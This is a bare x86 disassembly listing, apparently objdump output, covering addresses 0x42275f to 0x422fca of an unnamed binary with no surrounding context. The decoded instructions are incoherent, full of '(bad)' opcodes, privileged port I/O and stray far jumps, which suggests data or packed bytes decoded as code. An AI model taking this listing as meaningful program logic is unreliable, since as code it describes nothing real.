  42275f:	retf   0xb1d2
  422762:	rcl    ch,1
  422764:	(bad)  
  422766:	fstp   st(4)
  422768:	fcmovbe st,st(2)
  42276a:	jmp    0xf9fc:0xbcc2dbfa
  422771:	jmp    0x3f9:0xe6eaebf4
  422778:	aam    0xfe
  42277a:	out    0xa7,eax
  42277c:	enter  0xf6eb,0xcd
  422780:	enter  0xf4b0,0xe6
  422784:	out    0xc7,eax
  422786:	clc    
  422787:	mov    dh,0xf6
  422789:	hlt    
  42278a:	into   
  42278b:	int    0xba
  42278d:	in     eax,dx
  42278e:	stc    
  42278f:	lock shl dh,0xbc
  422793:	out    0xa,eax
  422795:	retf   
  422796:	out    dx,eax
  422797:	or     DWORD PTR [eax],eax
  422799:	retf   
  42279a:	out    dx,eax
  42279b:	mov    edi,0xc6adeec0
  4227a0:	mov    ah,0xe5
  4227a2:	retf   
  4227a3:	aad    0xfa
  4227a5:	mov    cl,0xf7
  4227a7:	mov    ebp,0xe2fec9be
  4227ac:	repnz mov esp,0xfbf6dfd5
  4227b2:	(bad)
  4227b6:	jmp    0xd2f0:0xc4d808c7
  4227bd:	mov    al,0xcf
  4227bf:	test   al,0xb4
  4227c2:	leave  
  4227c3:	iret   
  4227c4:	out    0xb8,eax
  4227c6:	mov    esi,0xd9e3d3f5
  4227cb:	into   
  4227cc:	jecxz  0x4227c6
  4227ce:	aad    0xfd
  4227d0:	(bad)  
  4227d2:	clc    
  4227d3:	imul   edi
  4227d5:	or     BYTE PTR [edx],al
  4227d7:	dec    esi
  4227d9:	call   0xc9f215ca
  4227de:	repnz in al,dx
  4227e0:	shl    dl,0xbb
  4227e3:	mov    ch,0xfa
  4227e5:	out    dx,eax
  4227e6:	repz mov ebp,0xbfb0cafc
  4227ec:	add    ah,dl
  4227ee:	out    0xf6,eax
  4227f0:	loope  0x4227d1
  4227f2:	add    eax,0x7eec5df
  4227f7:	in     eax,0xc6
  4227f9:	loop   0x4227ee
  4227fb:	(bad)  
  4227fc:	shl    edi,1
  4227fe:	div    BYTE PTR [ebp-0x2934103f]
  422804:	sar    al,1
  422806:	(bad)  
  422808:	cli    
  422809:	fsubp  st(6),st
  42280b:	fnstcw WORD PTR [ebp-0x2241291f]
  422811:	fsubrp st(6),st
  422813:	out    0xc0,al
  422815:	in     eax,0xcb
  422817:	aam    0xf3
  422819:	or     al,ah
  42281b:	stos   BYTE PTR es:[edi],al
  42281c:	fmul   st(0),st
  42281e:	out    dx,al
  42281f:	shl    ebx,0xea
  422822:	stc    
  422823:	out    0xf1,al
  422825:	fidiv  WORD PTR [edi+edi*4-0x460b0609]
  42282c:	mov    ecx,0xdaf00102
  422831:	stc    
  422832:	loopne 0x422816
  422834:	retf   0xd9fc
  422837:	or     ecx,DWORD PTR [edi]
  422839:	iret   
  42283a:	fmulp  st(1),st
  42283c:	scas   al,BYTE PTR es:[edi]
  42283d:	test   al,0xd3
  42283f:	out    0xe1,al
  422841:	loop   0x42281c
  422843:	in     al,0xf5
  422845:	rcl    esp,1
  422847:	hlt    
  422848:	mov    esp,0xd7babbd1
  42284d:	xrelease mov BYTE PTR [esi],0xf8
  422851:	add    bl,cl
  422853:	leave  
  422854:	add    bl,cl
  422856:	fisttp WORD PTR [esi]
  422858:	hlt    
  422859:	out    0xcb,eax
  42285b:	icebp  
  42285c:	mov    cl,0xdc
  42285e:	mov    ebp,0xc7bbd0c3
  422863:	aam    0xb1
  422865:	mov    bh,0xd9
  422867:	out    dx,eax
  422868:	mov    ecx,0xddd2bcdf
  42286d:	(bad)  
  42286f:	fcmove st,st(4)
  422871:	lock icebp 
  422873:	fmul   st(3),st
  422875:	or     edi,esi
  422877:	jmp    0x422861
  422879:	jecxz  0x422853
  42287b:	(bad)  
  42287c:	repnz int 0xb2
  42287f:	call   0xe7fcfa56
  422884:	ror    al,0xc5
  422887:	mov    ecx,0xd7dfbced
  42288c:	mov    ecx,0xc102c202
  422891:	retf   
  422892:	jmp    0xcbdc:0x1e307c5
  422899:	fsubr  st,st(2)
  42289b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42289c:	in     al,0xd3
  42289e:	out    dx,al
  42289f:	lods   al,BYTE PTR ds:[esi]
  4228a0:	ret    0xb2f5
  4228a3:	clc    
  4228a4:	aam    0xec
  4228a6:	mov    esi,0xd9caf4f7
  4228ab:	std    
  4228ac:	sar    BYTE PTR [esi+0x2f9e3e2],1
  4228b2:	clc    
  4228b3:	in     eax,0xc0
  4228b5:	loope  0x4228a1
  4228b7:	jecxz  0x422894
  4228b9:	add    al,BYTE PTR [ebx]
  4228bb:	mov    ecx,0xc9d4edd2
  4228c1:	leave  
  4228c2:	aam    0xf3
  4228c4:	sar    cl,0xfb
  4228c7:	jmp    0xd1cf:0xe1fb02b9
  4228ce:	rol    esi,1
  4228d0:	(bad)  
  4228d2:	lock (bad) 
  4228d6:	mov    esp,0xff0ccdd4
  4228db:	(bad)  [esi-0x4c1f1640]
  4228e1:	icebp  
  4228e2:	mov    ebx,0xccedb1cb
  4228e7:	out    dx,eax
  4228e8:	lock mov edi,0xd0bd00ee
  4228ee:	icebp  
  4228ef:	mov    ebx,0xf5e4f6e1
  4228f4:	cld    
  4228f5:	hlt    
  4228f6:	push   cs
  4228f7:	push   es
  4228f8:	in     al,0xc
  4228fa:	fdivrp st(1),st
  4228fc:	into   
  4228fd:	int    0xf2
  4228ff:	shl    DWORD PTR [ebp-0x453e493e],0xad
  422906:	(bad)  
  422907:	mov    eax,0xb9c8cbeb
  42290c:	(bad)  
  42290d:	repz shl dh,1
  422910:	sti    
  422911:	rol    DWORD PTR [ecx+edx*8],1
  422914:	call   0x543271e
  422919:	add    al,0xe3
  42291b:	lock test al,0xcb
  42291e:	into   
  42291f:	rol    edi,cl
  422921:	(bad)
  422924:	int    0xd6
  422926:	retf   
  422927:	(bad)  
  422928:	call   0xe11f2109
  42292d:	pop    es
  42292e:	mov    DWORD PTR [ecx],0xc000e3bd
  422934:	clc    
  422935:	aad    0xcf
  422937:	push   cs
  422938:	jmp    0xc3e7:0xe3f30b04
  42293f:	call   0xec33d5f6
  422944:	ffreep st(5)
  422946:	jmp    0xf1ce:0xf7f9cbb7
  42294d:	mov    ch,0xdd
  42294f:	add    dl,cl
  422951:	sar    ebx,1
  422953:	out    0xd7,al
  422955:	cmc    
  422956:	cli    
  422957:	out    0xec,al
  422959:	add    ebp,edi
  42295b:	lods   al,BYTE PTR ds:[esi]
  42295c:	iret   
  42295d:	loop   0x422934
  42295f:	not    dl
  422961:	out    dx,al
  422962:	stc    
  422963:	rol    esp,cl
  422965:	cmc    
  422966:	mov    ch,0xd4
  422968:	out    dx,al
  422969:	retf   0xf0c8
  42296c:	(bad)  
  42296d:	loopne 0x422936
  42296f:	shl    edx,0xcb
  422972:	add    BYTE PTR [eax],cl
  422974:	jmp    0x422970
  422976:	(bad)  
  422978:	fcmovne st,st(5)
  42297a:	out    0xd2,eax
  42297c:	enter  0xb7a9,0xd4
  422980:	mov    dl,0xd0
  422982:	mov    bh,0xf9
  422984:	scas   al,BYTE PTR es:[edi]
  422985:	imul   bh
  422987:	cld    
  422988:	out    dx,al
  422989:	rcr    ah,1
  42298b:	mov    edi,0xfdccfada
  422990:	idiv   ch
  422992:	fdivr  QWORD PTR [edi-0x31302000]
  422998:	cld    
  422999:	repz int 0xe5
  42299c:	mov    ebp,0xd2d4e9ca
  4229a1:	ret    0xc1fa
  4229a4:	frstpm(287 only) 
  4229a6:	(bad)  
  4229a8:	retf   0xcedb
  4229ab:	enter  0xdecd,0xc6
  4229af:	icebp  
  4229b0:	(bad)  
  4229b1:	test   DWORD PTR [ebx],0xdfeec9f4
  4229b7:	add    cl,al
  4229b9:	sti    
  4229ba:	add    al,0xef
  4229bc:	imul   edi
  4229be:	out    dx,eax
  4229bf:	in     eax,0xd7
  4229c1:	iret   
  4229c2:	(bad)  
  4229c3:	jmp    0xb9ef0eb6
  4229c8:	int    0xdb
  4229ca:	mov    al,0xde
  4229cc:	fsqrt  
  4229ce:	lock ret 
  4229d0:	repnz add edi,DWORD PTR [eax+0x706d7ea]
  4229d7:	into   
  4229d8:	enter  0x613,0xd2
  4229dc:	call   0xae19ce8a
  4229e1:	out    dx,al
  4229e2:	repz (bad) 
  4229e4:	(bad)  
  4229e6:	std    
  4229e7:	hlt    
  4229e8:	fst    st(5)
  4229ea:	mov    ebx,0xfaddc0bd
  4229ef:	repz (bad) 
  4229f2:	add    al,0xd1
  4229f4:	cmc    
  4229f5:	in     al,0xc7
  4229f7:	les    ecx,FWORD PTR [esi]
  4229f9:	fimul  WORD PTR [ebx]
  4229fb:	repz mov esi,0xd3afc6ad
  422a01:	in     al,0xcf
  422a03:	in     eax,0xf8
  422a05:	jmp    0xf3b0:0xb8e8d7b6
  422a0c:	in     eax,dx
  422a0d:	aam    0xe7
  422a0f:	shl    cl,cl
  422a11:	in     al,0xb8
  422a13:	fld    DWORD PTR [eax]
  422a15:	fmul   st,st(1)
  422a17:	call   0xe90b04e2
  422a1c:	fild   QWORD PTR [esi-0x4e140c1c]
  422a22:	jmp    0xdf0d0fec
  422a27:	mov    edx,0xd0e3f6e8
  422a2c:	inc    BYTE PTR [ebx]
  422a2e:	ret    
  422a2f:	xlat   BYTE PTR ds:[ebx]
  422a30:	or     edx,eax
  422a32:	fsubr  st,st(2)
  422a34:	add    eax,0xf8c4fce3
  422a39:	out    dx,al
  422a3a:	push   es
  422a3b:	icebp  
  422a3c:	mov    esp,0xaaeebcce
  422a41:	test   eax,0xd5c7b5e7
  422a46:	stc    
  422a47:	idiv   BYTE PTR [ebx-0x4032222]
  422a4d:	mov    esp,0xf7d9f0f7
  422a52:	fimul  WORD PTR [edx]
  422a54:	fdivr  st,st(5)
  422a56:	bswap  edx
  422a58:	(bad)  
  422a59:	int3   
  422a5a:	jmp    eax
  422a5c:	repz lock mov bl,0xd2
  422a60:	iret   
  422a61:	jmp    0xe82aef40
  422a66:	lods   al,BYTE PTR ds:[esi]
  422a67:	(bad)  
  422a68:	fnstcw WORD PTR [ebp-0x380c3e06]
  422a6e:	neg    esi
  422a70:	cli    
  422a71:	add    eax,0xd6e50809
  422a76:	jmp    0x422a85
  422a78:	in     al,dx
  422a79:	fdivrp st(1),st
  422a7b:	jecxz  0x422a2f
  422a7d:	ror    ecx,1
  422a7f:	shl    ebp,0xb2
  422a82:	loopne 0x422a4b
  422a84:	mov    cl,0xcb
  422a86:	mov    ch,0xc4
  422a88:	jmp    0x422a80
  422a8a:	rcl    bh,1
  422a8c:	repz mov ebp,0xdec2cdc7
  422a92:	aad    0xf5
  422a94:	or     ch,bl
  422a96:	pop    es
  422a97:	fdiv   st(1),st
  422a99:	retf   
  422a9a:	or     al,0xca
  422a9c:	mov    cl,0xb0
  422a9e:	repnz mov bh,0xd6
  422aa1:	ret    0xd3e5
  422aa4:	repnz mov edi,0xf8dae4f3
  422aaa:	shr    ah,1
  422aac:	cli    
  422aad:	(bad)  
  422aaf:	stc    
  422ab0:	(bad)  
  422ab1:	rcr    al,1
  422ab3:	lds    ecx,FWORD PTR [edx]
  422ab5:	add    ebp,eax
  422ab7:	in     al,dx
  422ab8:	fxch   st(6)
  422aba:	iret   
  422abb:	mov    bl,0xee
  422abd:	lock jmp 0x422aab
  422ac0:	(bad)
  422ac3:	out    dx,al
  422ac4:	imul   DWORD PTR [ebp-0xf24250d]
  422aca:	repz dec bh
  422acd:	mov    eax,0xd700fbff
  422ad2:	aam    0xdc
  422ad4:	cmc    
  422ad5:	xlat   BYTE PTR ds:[ebx]
  422ad6:	in     eax,0x3
  422ad8:	cld    
  422ad9:	or     eax,0xbce4efe2
  422ade:	rcl    edx,1
  422ae0:	out    dx,eax
  422ae1:	int3   
  422ae2:	loop   0x422adf
  422ae4:	in     eax,0xbf
  422ae6:	call   ebx
  422ae8:	cld    
  422ae9:	repz fild DWORD PTR [ebx]
  422aec:	ret    0xc0d7
  422aef:	add    ebx,esp
  422af1:	fild   WORD PTR ds:0xe8fb0207
  422af7:	(bad)  
  422af9:	retf   
  422afa:	icebp  
  422afb:	leave  
  422afc:	loopne 0x422aeb
  422afe:	mov    bl,0xc7
  422b00:	mov    esp,0xd3f6d3fa
  422b05:	(bad)  
  422b07:	mov    ch,0xfd
  422b09:	fdivp  st(2),st
  422b0b:	cmc    
  422b0c:	repz stc 
  422b0e:	jecxz  0x422aec
  422b10:	jecxz  0x422ad5
  422b12:	(bad)  
  422b13:	in     eax,0xc4
  422b15:	out    dx,al
  422b16:	(bad)  
  422b18:	ret    0xcc06
  422b1b:	fsub   st,st(5)
  422b1d:	retf   0xcfd5
  422b20:	mov    ch,0xf6
  422b22:	mov    edx,0xefd3cbf8
  422b27:	into   
  422b28:	std    
  422b29:	call   0xe235e52a
  422b2e:	not    esp
  422b30:	vcmpordsd xmm7,xmm0,xmm0
  422b35:	add    eax,0xcbd90805
  422b3a:	icebp  
  422b3b:	lock out dx,al
  422b3d:	out    0xc2,eax
  422b3f:	loop   0x422b13
  422b41:	lods   eax,DWORD PTR ds:[esi]
  422b42:	mov    ah,0xd5
  422b44:	mov    al,0xdb
  422b46:	shr    cl,cl
  422b48:	mov    edi,0xf401faf3
  422b4d:	aam    0xf1
  422b4f:	(bad)  
  422b50:	jecxz  0x422b26
  422b52:	cld    
  422b53:	loopne 0x422b33
  422b55:	std    
  422b56:	mov    esp,0xe2e503ec
  422b5b:	mov    edi,0xe0ede3cd
  422b60:	test   ch,0xe8
  422b63:	enter  0xe8eb,0xb9
  422b67:	fst    st(2)
  422b69:	enter  0xd2ec,0xfc
  422b6d:	neg    ecx
  422b6f:	add    ecx,edx
  422b71:	add    al,0xc3
  422b73:	add    al,0xc2
  422b75:	out    0xa,al
  422b77:	add    BYTE PTR [ebx+edx*8],al
  422b7a:	adc    edx,ecx
  422b7c:	lods   eax,DWORD PTR ds:[esi]
  422b7d:	(bad)  
  422b7e:	jmp    0xcceed654
  422b83:	not    ebp
  422b85:	iret   
  422b86:	leave  
  422b87:	mov    eax,0xbff1b8fe
  422b8c:	out    dx,eax
  422b8d:	fst    st(4)
  422b8f:	int3   
  422b90:	loope  0x422b92
  422b92:	retf   
  422b93:	in     al,0xc8
  422b95:	retf   0xffd9
  422b98:	call   0xee0d096a
  422b9d:	out    dx,eax
  422b9e:	out    dx,al
  422b9f:	shl    esp,1
  422ba1:	jmp    0x422b4b
  422ba3:	cli    
  422ba4:	(bad)  
  422ba5:	icebp  
  422ba6:	into   
  422ba7:	(bad)  
  422ba8:	cmc    
  422ba9:	xlat   BYTE PTR ds:[ebx]
  422baa:	aam    0xc8
  422bac:	mov    esp,0xf3c2dcfa
  422bb1:	add    bl,dh
  422bb3:	out    0xf,eax
  422bb5:	(bad)  
  422bb6:	cli    
  422bb7:	or     al,0xe7
  422bb9:	into   
  422bba:	out    0xc9,eax
  422bbc:	(bad)  
  422bbe:	leave  
  422bbf:	int3   
  422bc0:	shr    eax,0xf5
  422bc3:	loope  0x422b80
  422bc5:	out    0xcc,eax
  422bc7:	(bad)  
  422bc8:	mov    eax,0x7ffd9b9
  422bcd:	sti    
  422bce:	add    eax,0x6d5ecec
  422bd3:	fcmovu st,st(5)
  422bd5:	vpsubd ymm4,ymm1,ymm4
  422bd9:	or     bl,ah
  422bdb:	jmp    0x422b95
  422bdd:	test   eax,0xd1c2adae
  422be2:	test   al,0xe5
  422be4:	(bad)  
  422be5:	stc    
  422be6:	cli    
  422be7:	in     al,dx
  422be8:	mov    ebx,0xfebbf4b1
  422bed:	cld    
  422bee:	in     eax,0xf9
  422bf0:	jecxz  0x422bb7
  422bf2:	hlt    
  422bf3:	loop   0x422bd9
  422bf5:	xlat   BYTE PTR ds:[ebx]
  422bf6:	in     al,0x8
  422bf8:	dec    DWORD PTR [edx]
  422bfa:	stc    
  422bfb:	mov    edi,0xe1ccafaf
  422c00:	jmp    0xd4f8:0xcbedd3b6
  422c07:	retf   
  422c08:	jecxz  0x422c02
  422c0a:	stc    
  422c0b:	int3   
  422c0c:	cmc    
  422c0d:	rcl    ebx,0xf4
  422c10:	(bad)  
  422c12:	fdivr  st(1),st
  422c14:	(bad)  
  422c15:	std    
  422c16:	out    dx,al
  422c17:	stc    
  422c18:	add    ch,ah
  422c1a:	in     eax,dx
  422c1b:	(bad)
  422c1e:	cmc    
  422c1f:	mov    esp,0xc8dbe7f2
  422c24:	int    0xda
  422c26:	les    edi,FWORD PTR [esi-0xb291043]
  422c2c:	iret   
  422c2d:	rcr    bl,1
  422c2f:	jecxz  0x422c22
  422c31:	jmp    0x701:0xf5e5e1da
  422c38:	jmp    0x422bfb
  422c3a:	pop    es
  422c3b:	in     eax,0xc0
  422c3d:	in     al,0xee
  422c3f:	test   cl,0xb5
  422c42:	loop   0x422c1a
  422c44:	cli    
  422c45:	mov    bh,0xf2
  422c47:	stc    
  422c48:	mov    esp,0x1d3ecf3
  422c4d:	(bad)  
  422c4f:	in     eax,dx
  422c50:	mov    ebp,0xc9e9e4bd
  422c55:	out    dx,eax
  422c56:	out    dx,al
  422c57:	push   es
  422c58:	retf   
  422c59:	std    
  422c5a:	fisubr WORD PTR [edx-0x18283323]
  422c60:	lock shl ah,0xc1
  422c64:	(bad)  
  422c65:	sti    
  422c66:	(bad)  
  422c68:	retf   0xffff
  422c6b:	shr    eax,0xe2
  422c6e:	aam    0xed
  422c70:	in     al,dx
  422c71:	icebp  
  422c72:	fnsetpm(287 only) 
  422c74:	fadd   QWORD PTR [edi*8-0x1afcfef2]
  422c7b:	fld    st(2)
  422c7d:	out    0xb3,eax
  422c7f:	lock int3 
  422c81:	loope  0x422c5c
  422c83:	out    0xe7,eax
  422c85:	sar    ebp,1
  422c87:	out    dx,eax
  422c88:	mov    esp,0xdae8e8fa
  422c8d:	iret   
  422c8e:	icebp  
  422c8f:	loopne 0x422c4d
  422c91:	fstp   st(5)
  422c93:	mov    edi,0xfdfac4f5
  422c98:	clc    
  422c99:	(bad)  
  422c9a:	fdivr  st(3),st
  422c9c:	icebp  
  422c9d:	mov    esp,0xe1eccade
  422ca2:	mov    ch,0xe6
  422ca4:	loopne 0x422c8f
  422ca6:	fcmovnu st,st(1)
  422ca8:	jmp    0xfa33e96c
  422cad:	add    edx,ebx
  422caf:	inc    BYTE PTR ds:0x9d5c7d2
  422cb5:	iret   
  422cb6:	in     eax,dx
  422cb7:	in     eax,dx
  422cb8:	jmp    0xd0eb1299
  422cbd:	mov    edi,0xfbdcc9c7
  422cc2:	retf   
  422cc3:	mov    ah,0xdf
  422cc5:	(bad)  
  422cc6:	mov    ecx,0xbfeecdbf
  422ccb:	int3   
  422ccc:	rol    cl,1
  422cce:	ret    
  422ccf:	rcr    esi,1
  422cd1:	inc    DWORD PTR [esp+eiz*8]
  422cd4:	retf   
  422cd5:	(bad)
  422cd8:	add    al,0xcf
  422cda:	add    al,0xb1
  422cdc:	(bad)
  422cdf:	mov    ebp,0xcdc9f7f0
  422ce4:	retf   
  422ce5:	mov    ah,0xb8
  422ce7:	(bad)  
  422ce9:	call   0xc11726ed
  422cee:	(bad)  
  422cef:	sar    DWORD PTR [ebp-0x2f28fff6],1
  422cf5:	loope  0x422cc2
  422cf7:	or     eax,0xad0ef3e4
  422cfc:	repnz (bad) 
  422cfe:	iret   
  422cff:	mov    dh,0xaa
  422d01:	out    dx,al
  422d02:	sar    ecx,cl
  422d04:	(bad)  
  422d06:	(bad)  
  422d08:	hlt    
  422d09:	int    0xd2
  422d0b:	rcr    ebx,cl
  422d0d:	dec    ch
  422d0f:	icebp  
  422d10:	jecxz  0x422cf9
  422d12:	cli    
  422d13:	icebp  
  422d14:	shr    bh,0xf8
  422d17:	iret   
  422d18:	push   es
  422d19:	out    0xff,al
  422d1b:	lods   al,BYTE PTR ds:[esi]
  422d1c:	les    esi,FWORD PTR [edi-0x28493c0e]
  422d22:	out    0xe1,eax
  422d24:	repnz fistp QWORD PTR [eax-0x23292243]
  422d2b:	sti    
  422d2c:	mov    dh,0xc3
  422d2e:	add    bh,dl
  422d30:	out    0xe3,al
  422d32:	in     eax,0xbf
  422d34:	add    al,0xa
  422d36:	leave  
  422d37:	out    0xe8,eax
  422d39:	stc    
  422d3a:	or     al,0xc1
  422d3c:	mov    bl,0xb7
  422d3e:	out    dx,eax
  422d3f:	scas   eax,DWORD PTR es:[edi]
  422d40:	lock iret 
  422d42:	fucomi st,st(0)
  422d44:	scas   al,BYTE PTR es:[edi]
  422d45:	mov    ebx,0xbcebd9b8
  422d4a:	mov    esi,0xbffdcee2
  422d4f:	sti    
  422d50:	les    ecx,FWORD PTR [ebx]
  422d52:	cld    
  422d53:	push   es
  422d54:	cmc    
  422d55:	clc    
  422d56:	push   cs
  422d57:	jmp    0xcad2:0xc0090bf4
  422d5e:	retf   
  422d5f:	repnz loop 0x422d2a
  422d62:	out    0xe0,eax
  422d64:	out    dx,al
  422d65:	fcomip st,st(7)
  422d67:	repnz sti 
  422d69:	add    cl,ah
  422d6b:	jecxz  0x422d5f
  422d6d:	stc    
  422d6e:	mov    eax,0xf5e0dbe6
  422d73:	lock add al,0x4
  422d76:	aad    0xdf
  422d78:	in     eax,dx
  422d79:	out    dx,al
  422d7a:	into   
  422d7b:	loopne 0x422d2e
  422d7d:	shr    edx,1
  422d7f:	int3   
  422d80:	in     al,0xe3
  422d82:	lods   al,BYTE PTR ds:[esi]
  422d83:	sar    BYTE PTR [eax-0x21484546],0xf2
  422d8a:	fild   DWORD PTR [ebx]
  422d8c:	(bad)  
  422d8d:	loope  0x422d86
  422d8f:	mov    ebx,0xe8d4d906
  422d95:	cld    
  422d96:	iret   
  422d97:	retf   0xcdd4
  422d9a:	(bad)  
  422d9b:	retf   0xdfe2
  422d9e:	(bad)  
  422d9f:	fst    st(7)
  422da1:	mov    bl,0xc9
  422da3:	fmul   st,st(2)
  422da5:	int3   
  422da6:	sar    bl,cl
  422da8:	lock jmp 0xd8f1:0xe7c8d503
  422db0:	pop    es
  422db1:	hlt    
  422db2:	sar    ebx,0xd9
  422db5:	jecxz  0x422d8d
  422db7:	push   es
  422db8:	push   es
  422db9:	loope  0x422dcd
  422dbb:	jmp    0xd6ec:0xcbbdceaf
  422dc2:	(bad)  
  422dc3:	into   
  422dc4:	out    0xec,al
  422dc6:	into   
  422dc7:	in     eax,0xb9
  422dc9:	(bad)  
  422dcb:	mov    esi,0xd6f3eedc
  422dd0:	int3   
  422dd1:	aam    0xe1
  422dd3:	(bad)  
  422dd4:	(bad)  
  422dd5:	(bad)  
  422dd6:	cli    
  422dd7:	in     eax,dx
  422dd8:	jmp    0xddae:0xd1ea0404
  422ddf:	xlat   BYTE PTR ds:[ebx]
  422de0:	scas   al,BYTE PTR es:[edi]
  422de1:	mov    al,0xdb
  422de3:	in     eax,0xcb
  422de5:	in     al,0xb4
  422de7:	in     al,0xde
  422de9:	(bad)  
  422deb:	out    dx,eax
  422dec:	out    dx,eax
  422ded:	icebp  
  422dee:	mov    eax,0xd1c5fbd2
  422df3:	fadd   QWORD PTR [edi]
  422df5:	rcr    esi,0xe3
  422df8:	call   0xefed17df
  422dfd:	lock loop 0x422daf
  422e00:	mov    dl,0xc8
  422e02:	int3   
  422e03:	sti    
  422e04:	mov    ecx,0xfacab6b4
  422e09:	hlt    
  422e0a:	cli    
  422e0b:	out    dx,eax
  422e0c:	loopne 0x422df4
  422e0e:	add    ah,cl
  422e10:	(bad)  
  422e12:	cli    
  422e13:	(bad)  
  422e14:	jmp    0xf8c5:0x3c8eae9
  422e1b:	retf   0xf1e0
  422e1e:	out    dx,al
  422e1f:	mov    dh,0xd3
  422e22:	(bad)  
  422e23:	jmp    0xd70906d8
  422e28:	(bad)  
  422e2a:	hlt    
  422e2b:	mov    ecx,0xd9cdd7d2
  422e30:	inc    edx
  422e32:	add    esp,ebx
  422e34:	clc    
  422e35:	retf   
  422e36:	hlt    
  422e37:	jecxz  0x422e04
  422e39:	or     eax,0xa9cfd305
  422e3e:	shl    al,cl
  422e40:	out    0xf7,eax
  422e42:	cli    
  422e43:	loope  0x422e2a
  422e45:	jmp    0xf8cd:0xece4b5ac
  422e4c:	mov    esp,0x3bd01e0
  422e51:	std    
  422e52:	pop    es
  422e53:	std    
  422e54:	(bad)  
  422e56:	add    al,BYTE PTR [edi]
  422e58:	in     al,dx
  422e59:	retf   0xcbe5
  422e5c:	shr    DWORD PTR [eax-0x164c1831],0xd9
  422e63:	repnz retf 0xf7fb
  422e67:	int3   
  422e68:	xlat   BYTE PTR ds:[ebx]
  422e69:	repz repnz in eax,dx
  422e6c:	add    ch,cl
  422e6e:	int3   
  422e6f:	jmp    ecx
  422e71:	fcmovnbe st,st(5)
  422e73:	add    ebx,ecx
  422e75:	cmc    
  422e76:	add    al,0xdf
  422e78:	jecxz  0x422e7d
  422e7a:	push   gs
  422e7c:	xlat   BYTE PTR ds:[ebx]
  422e7d:	shl    dl,cl
  422e7f:	mov    al,0xdc
  422e81:	cli    
  422e82:	mov    edx,0xbafaeaf8
  422e87:	cmc    
  422e88:	lock leave 
  422e8a:	shr    cl,1
  422e8c:	int    0xdd
  422e8e:	add    al,dh
  422e90:	or     edi,ecx
  422e92:	out    0xd0,al
  422e94:	loopne 0x422e5b
  422e96:	jmp    0xacf0:0xecd3cc0b
  422e9d:	mov    al,0xec
  422e9f:	fdivr  QWORD PTR [ebx+eax*8-0xf474427]
  422ea6:	in     eax,0xb9
  422ea8:	retf   0xded9
  422eab:	(bad)  
  422ead:	mov    esi,0xfff0fcfb
  422eb2:	fcmovb st,st(3)
  422eb4:	dec    ecx
  422eb6:	leave  
  422eb7:	(bad)  
  422eb9:	or     bl,ch
  422ebb:	lds    edi,FWORD PTR [ebp-0x4f2e3b36]
  422ec1:	in     al,dx
  422ec2:	out    dx,eax
  422ec3:	mov    cl,0xf0
  422ec5:	out    0xef,eax
  422ec7:	int3   
  422ec8:	icebp  
  422ec9:	iret   
  422eca:	mov    ah,0xd2
  422ecc:	into   
  422ecd:	loopne 0x422ea1
  422ecf:	int    0xe0
  422ed1:	fdivrp st(6),st
  422ed3:	icebp  
  422ed4:	cld    
  422ed5:	(bad)  
  422ed6:	fcomp  st(2)
  422ed8:	out    0xfe,eax
  422eda:	loopne 0x422ea6
  422edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422edd:	ret    0xccbd
  422ee0:	lock out 0xbb,eax
  422ee3:	aad    0xf7
  422ee5:	lods   eax,DWORD PTR ds:[esi]
  422ee6:	int3   
  422ee7:	(bad)  
  422ee8:	int3   
  422ee9:	retf   0x3b8
  422eec:	rol    edi,0xdc
  422eef:	sar    ebp,1
  422ef1:	rol    esp,0xf5
  422ef4:	(bad)  
  422ef5:	add    cl,BYTE PTR [eax]
  422ef7:	aad    0xc
  422ef9:	adc    ah,bh
  422efb:	int3   
  422efc:	ret    0xcabc
  422eff:	(bad)  [ebp+ecx*8-0x17243a2a]
  422f06:	aad    0xc9
  422f08:	retf   
  422f09:	fdivrp st(6),st
  422f0b:	mov    esp,0xcdc0bcd6
  422f10:	mov    esp,0xd7dce3e2
  422f15:	cmc    
  422f16:	sti    
  422f17:	hlt    
  422f18:	or     ebp,edi
  422f1a:	shr    DWORD PTR [edx+ebp*4-0x1216092f],cl
  422f21:	mov    ah,0xda
  422f23:	shl    bh,0xd6
  422f26:	(bad)  
  422f28:	aad    0xfb
  422f2a:	mov    esp,0x5d9d0e1
  422f2f:	clc    
  422f30:	lock mov ebp,0xe0f6fce5
  422f36:	hlt    
  422f37:	fcmove st,st(1)
  422f39:	bswap  edi
  422f3b:	fnstcw WORD PTR [edi-0x17285230]
  422f41:	lods   eax,DWORD PTR ds:[esi]
  422f42:	ret    0xf2ce
  422f45:	mov    al,0xd6
  422f47:	mov    ebp,0xb9f0d4fe
  422f4c:	mov    eax,0xebbc02c7
  422f51:	or     ah,ah
  422f53:	(bad)  
  422f55:	jecxz  0x422f4b
  422f57:	enter  0xd05,0x4
  422f5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f5c:	stos   BYTE PTR es:[edi],al
  422f5d:	jecxz  0x422f24
  422f5f:	leave  
  422f60:	out    dx,al
  422f61:	int3   
  422f62:	(bad)  
  422f63:	mov    al,0xcc
  422f65:	lods   eax,DWORD PTR ds:[esi]
  422f66:	retf   
  422f67:	rcr    ebx,cl
  422f69:	aam    0xcf
  422f6b:	repz call 0xfafeed6f
  422f71:	stc    
  422f72:	(bad)  
  422f73:	fadd   st,st(4)
  422f75:	(bad)  
  422f77:	std    
  422f78:	out    0xca,eax
  422f7a:	add    BYTE PTR [eax-0x3b3e154f],ch
  422f80:	loopne 0x422f6c
  422f82:	mov    ch,0xea
  422f84:	lock (bad) 
  422f86:	mov    edx,0xc2bee3ff
  422f8b:	out    dx,al
  422f8c:	xlat   BYTE PTR ds:[ebx]
  422f8d:	repnz aad 0xc5
  422f90:	rcr    edx,0xc7
  422f93:	xlat   BYTE PTR ds:[ebx]
  422f94:	retf   0xcae9
  422f97:	enter  0xe103,0xd9
  422f9b:	jecxz  0x422f7c
  422f9d:	(bad)  
  422f9e:	repnz scas al,BYTE PTR es:[edi]
  422fa0:	mov    esp,0xf2f4b4e7
  422fa5:	mov    bh,0xfa
  422fa7:	out    dx,eax
  422fa8:	sti    
  422fa9:	stc    
  422faa:	icebp  
  422fab:	loop   0x422f9d
  422fad:	mov    esp,0xc1f7e3dd
  422fb2:	aad    0xa
  422fb4:	lock or cl,ah
  422fb7:	fimul  DWORD PTR [ebx]
  422fb9:	retf   0xd9df
  422fbc:	in     eax,0xf0
  422fbe:	shl    esp,1
  422fc0:	jmp    0x422f9c
  422fc2:	call   0xf0f2f5ab
  422fc7:	in     al,dx
  422fc8:	mov    dh,0xf6
  422fca:	iret   
